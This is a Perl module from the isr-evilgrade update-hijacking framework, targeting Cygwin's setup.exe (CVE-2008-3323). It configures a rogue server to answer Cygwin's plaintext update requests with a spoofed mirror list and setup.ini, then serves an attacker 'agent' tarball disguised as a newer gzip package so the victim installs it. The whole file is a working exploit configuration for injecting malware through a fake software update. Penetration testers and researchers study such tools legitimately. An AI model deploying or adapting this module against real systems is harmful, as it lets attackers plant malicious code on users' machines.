###############
# cygwin.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::cygwin;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'    => 'Cygwin',
    'version' => '1.0',
    'appver'  => '<= 1.5.25-11',
    'author'  => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' =>
        qq{Cygwin is a Linux-like environment for Microsoft Windows copyrighted by
    Red Hat, Inc. Tarball software packages are installed and updated via
    setup.exe. This program downloads a package list and packages from
    mirrors over plaintext HTTP or FTP. The package list contains MD5
    checksums for verifying package integrity. If a rogue server answers the
    HTTP request responsible for package updates and responds with a
    modified MD5 string setup.exe will download and install a malicious package.},
    'references' => [ [ 'BID', '' ], [ 'CVE', '2008-3323' ], ],
    'vh'         => 'cygwin.com',
    'request'    => [
        {   'req'    => '/mirrors.lst',    #regex friendly
            'type'   => 'string',          #file|string|agent|install
            'method' => '',                #any
            'bin'    => '',
            'string' =>
                "http://cygwin.com/cygwin;mirror.cygwin.com;North America;New York",
            'parse' => '0',
            'file'  => ''
        },
        {   'req'    => 'setup.ini',       #regex friendly
            'type'   => 'file',            #file|string|agent|install
            'method' => '',                #any
            'bin'    => '',
            'string' => "",
            'parse'  => '1',
            'file' => './include/cygwin/cygwin_setup.ini'
        },
        {   'req'    => '(.tar.bz2)',      #regex friendly
            'type'   => 'agent',           #file|string|agent|install
            'method' => '',                #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => '',
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/cygwin_file.tar.bz2',
            'desc' => 'Agent to inject (buggy gzip)'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'name' => {
            'val'  => 'gzip',
            'desc' => 'Package name'
        },
        'desc' => {
            'val'  => 'The GNU compression utility',
            'desc' => 'Description'
        },
        'category' => {
            'val'  => 'Base',
            'desc' => 'Category'
        },
        'requires' => {
            'val'  => 'cygwin',
            'desc' => ''
        },
        'version' => {
            'val'  => '3.1.33-7',
            'desc' => ''
        },
        'install' => {
            'val'  => 'release/gzip/gzip-3.1.33-7.tar.bz2',
            'desc' => ''
        },
        'source' => {
            'val'  => 'release/gzip/gzip-3.1.33-7-src.tar.bz2',
            'desc' => ''
        },
        'pversion' => {
            'val'  => '1.3.12-1',
            'desc' => ''
        },
        'pinstall' => {
            'val'  => 'release/gzip/gzip-1.3.12-1.tar.bz2',
            'desc' => ''
        },
        'psource' => {
            'val'  => 'release/gzip/gzip-1.3.12-1-src.tar.bz2',
            'desc' => ''
        },
        'sversion' => {
            'val'  => '2.573.2.2',
            'desc' => 'setup version'
        },
        'timestamp' => {
            'val'     => 'time + + 604800',
            'hidden'  => 1,
            'dynamic' => 1,
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
